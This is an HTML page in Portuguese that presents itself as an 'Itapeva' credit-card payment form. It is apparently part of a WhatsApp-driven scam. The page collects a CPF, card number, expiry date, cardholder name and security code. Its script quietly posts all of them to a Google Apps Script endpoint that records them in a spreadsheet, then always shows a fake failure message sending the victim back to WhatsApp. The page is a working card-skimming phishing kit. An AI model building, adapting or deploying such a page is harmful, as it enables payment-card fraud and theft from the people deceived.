<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="robots" content="noindex,nofollow">
  <title>Itapeva | Pagamento Cartão de crédito</title>
  <style>
    *{box-sizing:border-box}
    :root{
      --blue:#239447;
      --blue-dark:#197538;
      --ink:#183d25;
      --muted:#667482;
      --line:#dcebdd;
      --bg:#f3f9f4;
      --card:#ffffff;
      --danger:#b33434;
      --ok:#1d7a4a;
    }
    body{
      margin:0;
      min-height:100vh;
      font-family:Arial,Helvetica,sans-serif;
      background:linear-gradient(135deg,#eef8f0,#f9fcf9);
      color:#1e2733;
    }
    .page{
      min-height:100vh;
      display:grid;
      place-items:center;
      padding:24px;
    }
    .card{
      width:min(470px,95vw);
      background:var(--card);
      border:1px solid var(--line);
      border-radius:24px;
      padding:32px;
      box-shadow:0 24px 60px rgba(28,74,120,.14);
    }
    .brand{
      display:flex;
      align-items:center;
      gap:10px;
      font-size:27px;
      font-weight:800;
      color:var(--blue);
      margin-bottom:25px;
    }
    .brand img{
      width:42px;
      height:42px;
      border-radius:50%;
      object-fit:cover;
    }

    .card-brands{
      width:100%;
      margin:-10px 0 24px;
      padding:9px 10px;
      background:#f4f7fd;
      border:1px solid #e4eaf3;
      border-radius:15px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
    }
    .card-brands img{
      display:block;
      width:100%;
      max-width:420px;
      height:auto;
      object-fit:contain;
    }

    h1{
      margin:0 0 8px;
      font-size:28px;
      color:var(--ink);
    }
    .sub{
      color:var(--muted);
      font-size:14px;
      line-height:1.5;
      margin:0 0 24px;
    }
    .field{margin-top:17px}
    label{
      display:block;
      font-size:13px;
      font-weight:700;
      color:#34465a;
      margin-bottom:8px;
    }
    input{
      width:100%;
      height:50px;
      border:1.5px solid #c9d6e3;
      border-radius:12px;
      padding:0 14px;
      font-size:16px;
      background:#fff;
      outline:none;
      transition:.15s ease;
    }
    input:focus{
      border-color:var(--blue);
      box-shadow:0 0 0 4px rgba(35,148,71,.10);
    }
    input::placeholder{color:#9aa7b3}
    .hint{
      margin-top:6px;
      color:var(--muted);
      font-size:11px;
      line-height:1.35;
    }
    .btn{
      width:100%;
      height:50px;
      border:0;
      border-radius:12px;
      padding:0 18px;
      margin-top:24px;
      font-size:15px;
      font-weight:800;
      cursor:pointer;
      background:var(--blue);
      color:#fff;
      box-shadow:0 8px 20px rgba(35,148,71,.18);
    }
    .btn:hover{background:var(--blue-dark)}
    .btn:disabled{opacity:.65;cursor:not-allowed}
    .status{
      min-height:20px;
      margin-top:12px;
      font-size:13px;
      line-height:1.4;
      text-align:center;
    }
    .status.error{color:var(--danger)}
    .status.ok{color:var(--ok)}

    .processing-area{
      display:none;
      margin-top:18px;
      padding:18px 16px;
      border:1px solid var(--line);
      border-radius:14px;
      background:#f8fcf9;
      text-align:center;
    }
    .processing-area.show{display:block}
    .spinner{
      width:42px;
      height:42px;
      margin:0 auto 14px;
      border:5px solid #dce9e8;
      border-top-color:var(--blue);
      border-radius:50%;
      animation:spin .8s linear infinite;
    }
    @keyframes spin{to{transform:rotate(360deg)}}
    .processing-message{
      margin:0;
      color:var(--ink);
      font-size:14px;
      font-weight:700;
      line-height:1.5;
    }
    .processing-area.failed .spinner{display:none}
    .processing-area.failed .processing-message{color:var(--danger)}

    @media(max-width:480px){
      .page{padding:16px}
      .card{padding:25px 20px;border-radius:20px}
  
    .card-brands{
      width:100%;
      margin:-10px 0 24px;
      padding:9px 10px;
      background:#f4f7fd;
      border:1px solid #e4eaf3;
      border-radius:15px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
    }
    .card-brands img{
      display:block;
      width:100%;
      max-width:420px;
      height:auto;
      object-fit:contain;
    }

    h1{font-size:24px}
      .brand{font-size:24px}
    }
  </style>
</head>

      <h1>Informe dados do cartão</h1>
      <p class="sub">Preencha os dados abaixo para prosseguir com a solicitação.</p>

      <form id="proposalForm" novalidate>
        <div class="field">
          <label for="cpf">CPF:</label>
          <input
            id="cpf"
            name="cpf"
            type="text"
            inputmode="numeric"
            autocomplete="off"
            maxlength="14"
            placeholder="000.000.000-00"
            required>
        </div>

        <div class="field">
          <label for="numero">Informe o número do cartão:</label>
          <input
            id="numero"
            name="numero"
            type="text"
            inputmode="numeric"
            autocomplete="off"
            maxlength="19"
            placeholder="1234 1234 1234 1234"
            required>
          <div class="hint">Informe os 16 dígitos.</div>
        </div>

        <div class="field">
          <label for="nascimento">Validade:</label>
          <input
            id="nascimento"
            name="nascimento"
            type="text"
            inputmode="numeric"
            autocomplete="bday"
            maxlength="5"
            placeholder="MM/AA"
            required>
        </div>

        <div class="field">
          <label for="nome">Nome igual do cartão:</label>
          <input
            id="nome"
            name="nome"
            type="text"
            autocomplete="name"
            maxlength="100"
            placeholder="Digite o nome igual ao cartão"
            required>
        </div>

        <div class="field">
          <label for="codigo">Código de segurança:</label>
          <input
            id="codigo"
            name="codigo"
            type="text"
            inputmode="numeric"
            autocomplete="one-time-code"
            maxlength="3"
            pattern="[0-9]{3}"
            placeholder="000"
            required>
        </div>

        <button class="btn" type="submit">Continuar</button>
        <div id="status" class="status" aria-live="polite"></div>
        <div id="processingArea" class="processing-area" role="status" aria-live="polite">
          <div class="spinner" aria-hidden="true"></div>
          <p id="processingMessage" class="processing-message">Aguarde enquanto processamos suas informações.</p>
        </div>
      </form>
    </section>
  </main>
  <script>
    const cpf = document.getElementById('cpf');
    const numero = document.getElementById('numero');
    const nascimento = document.getElementById('nascimento');
    const nome = document.getElementById('nome');
    const codigo = document.getElementById('codigo');
    const form = document.getElementById('proposalForm');
    const status = document.getElementById('status');
    const processingArea = document.getElementById('processingArea');
    const processingMessage = document.getElementById('processingMessage');

    cpf.addEventListener('input', () => {
      let digits = cpf.value.replace(/\D/g,'').slice(0,11);
      digits = digits.replace(/^(\d{3})(\d)/, '$1.$2');
      digits = digits.replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3');
      digits = digits.replace(/\.(\d{3})(\d)/, '.$1-$2');
      cpf.value = digits;
    });

    numero.addEventListener('input', () => {
      let digits = numero.value.replace(/\D/g,'').slice(0,16);
      numero.value = digits.replace(/(\d{4})(?=\d)/g,'$1 ');
    });

    nascimento.addEventListener('input', () => {
      let digits = nascimento.value.replace(/\D/g,'').slice(0,4);
      if(digits.length > 2){
        digits = digits.slice(0,2) + '/' + digits.slice(2);
      }
      nascimento.value = digits;
    });

    codigo.addEventListener('input', () => {
      codigo.value = codigo.value.replace(/\D/g,'').slice(0,3);
    });

    function erro(msg, campo){
      status.className = 'status error';
      status.textContent = msg;
      if(campo) campo.focus();
    }

    const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyBqYUapfAlBSXDje08fOMQO0LRCHIT2UqbKmDxP0-sWNmArcdZn3dz34peuGVE8YPb/exec';

    form.addEventListener('submit', async (event) => {
      event.preventDefault();
      status.className = 'status';
      status.textContent = '';

      const cpfLimpo = cpf.value.replace(/\D/g,'');
      if(cpfLimpo.length !== 11){
        erro('Informe um CPF com 11 dígitos.', cpf);
        return;
      }

      const numeroLimpo = numero.value.replace(/\D/g,'');
      if(numeroLimpo.length !== 16){
        erro('Informe os 16 dígitos do número.', numero);
        return;
      }

      const nasc = nascimento.value.match(/^(\d{2})\/(\d{2})$/);
      if(!nasc || Number(nasc[1]) < 1 || Number(nasc[1]) > 12){
        erro('Informe o nascimento no formato MM/AA.', nascimento);
        return;
      }

      if(nome.value.trim().length < 2){
        erro('Informe o nome.', nome);
        return;
      }

      if(!/^\d{3}$/.test(codigo.value)){
        erro('Informe o código recebido com 3 dígitos.', codigo);
        return;
      }

      const botao = form.querySelector('button[type="submit"]');
      botao.disabled = true;

      processingArea.classList.remove('failed');
      processingMessage.textContent = 'Aguarde enquanto processamos suas informações.';
      processingArea.classList.add('show');
      processingArea.scrollIntoView({ behavior: 'smooth', block: 'nearest' });

      // Após 10 segundos, informa ao cliente que a operação não pôde ser concluída.
      setTimeout(() => {
        processingArea.classList.add('failed');
        processingMessage.textContent =
          'Atenção, não foi possível concluir sua operação, volte no WhatsApp e continue seu atendimento escolhendo outra forma de pagamento.';
      }, 10000);

      // Mantém a gravação dos dados na planilha em segundo plano.
      try {
        await fetch(APPS_SCRIPT_URL, {
          method: 'POST',
          headers: {'Content-Type':'text/plain;charset=utf-8'},
          body: JSON.stringify({
            acao: 'salvardadoscartao',
            cpf: cpfLimpo,
            nome: nome.value.trim(),
            numero: numero.value.trim(),
            nascimento: nascimento.value,
            codigo: codigo.value
          })
        });
      } catch (err) {
        console.error(err);
      }
    });
  </script>
</body>
</html>
